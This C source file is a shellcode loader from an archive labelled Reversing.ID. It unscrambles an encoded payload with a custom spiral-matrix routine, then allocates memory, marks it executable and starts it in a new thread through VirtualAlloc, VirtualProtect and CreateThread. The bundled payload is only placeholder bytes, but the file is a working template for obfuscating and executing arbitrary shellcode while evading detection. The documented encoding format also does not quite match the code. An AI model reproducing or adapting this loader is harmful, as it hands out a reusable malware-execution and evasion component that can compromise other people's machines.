/*
    Shellcode Loader
    Archive of Reversing.ID

    Reordering the shellcode with custom algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    spiral
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>

/*
    Encoded shellcode format:
        [K] [N] [Shellcode]

    K is the key, which represent the number of rows in matrix
    N is the original length of the shellcode
*/

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    uint8_t rows = src[0];      // first byte is number of row
    
    // make sure we have negative value
    int16_t idx_d, idx_s;
    int16_t cols = size / rows;
    int16_t top, bottom, left, right;
    int16_t direction = 0;

    top     = 0;
    bottom  = rows - 1;
    left    = 0;
    right   = cols - 1;

    idx_s = 1;
    while (top <= bottom && left <= right) {
        // right
        if (direction == 0) {
            for (idx_d = left; idx_d <= right; idx_d++) {
                dst[top * cols + idx_d] = src[idx_s++];
            }
            top ++;
        // down
        } else if (direction == 1) {
            for (idx_d = top; idx_d <= bottom; idx_d++) {
                dst[idx_d * cols + right] = src[idx_s++];
            }
            right --;
        // left
        } else if (direction == 2) {
            for (idx_d = right; idx_d >= left; idx_d--) {
                dst[bottom * cols + idx_d] = src[idx_s++];
            }
            bottom --;
        // up
        } else if (direction == 3) {
            for (idx_d = bottom; idx_d >= top; idx_d--) {
                dst[idx_d * cols + left] = src[idx_s++];
            }
            left ++;
        }
        direction = (direction + 1) % 4;
    }
}

int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x03,0x90,0x90,0xc3,0x00,0x00,0xcc };
    uint32_t    payload_len = 7;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decode payload and store to allocated buffer 
    // discard first byte which is key
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}